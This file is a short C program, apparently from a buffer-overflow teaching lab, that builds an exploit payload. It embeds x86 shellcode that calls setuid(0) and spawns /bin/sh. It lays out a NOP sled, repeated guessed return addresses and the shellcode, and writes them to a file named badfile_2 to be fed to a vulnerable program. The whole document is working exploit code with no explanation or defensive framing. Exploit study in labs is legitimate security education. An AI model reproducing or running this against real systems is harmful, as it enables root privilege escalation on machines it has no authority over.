#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=   "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";  

unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 24; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_2", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
